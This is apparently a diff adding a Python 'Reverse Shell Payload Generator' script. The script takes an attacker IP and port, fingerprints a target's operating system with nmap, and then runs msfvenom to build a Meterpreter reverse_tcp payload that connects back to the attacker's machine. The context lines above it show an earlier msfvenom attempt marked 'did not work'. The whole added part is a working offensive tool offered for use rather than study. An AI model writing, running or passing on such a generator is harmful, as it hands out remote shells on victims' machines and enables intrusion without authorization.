@@ -60,3 +60,47 @@ payload = "msfvenom -p "+os+"/x64/meterpreter/reverse_tcp LHOST="+attackerIP+" L
 print(payload)
 payload = filename
 print(payload) ---did not work
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+!/usr/bin/python
+ 
+import os
+import subprocess
+ 
+print("Welcome to the Reverse Shell Payload Generator")
+ 
+filename = input("Please enter desired filename: ")
+# Get info from user
+attackerIP = input("Please enter the IP of the attacker machine: ")
+attackerPort = input("Please enter the port of the attacker machine: ")
+ 
+# Enumerate target
+targetIP = input("Please enter the IP of the target machine: ")
+osInfo = str(subprocess.check_output(["nmap", "-O", targetIP]))
+print(type(osInfo))
+print(osInfo)
+ 
+os = ""
+ 
+if osInfo.find("windows") != -1:
+    print("Windows Found")
+    os = "windows"
+    print(os)
+elif osInfo.find("linux") != -1:
+    os = "linux"
+    print(os)
+elif osInfo.find("solarlis") !=-1:
+    os = "solaris"
+    print(os)
+ 
+if os == "":
+    print("[*] Unable to profile OS, defaulting to Windows.")
+    os = "windows"
+ 
+payload = ("msfvenom -p "+os+"/meterpreter/reverse_tcp LHOST="+attackerIP+" LPORT="+attackerPort+" EXITFUNC=thread -f raw -o " + filename)
+print("[*] Exporting payload, please be patient as: " + filename)
+subprocess.Popen(payload, shell=True).wait()
+print("[*] Exported payload successfully.")
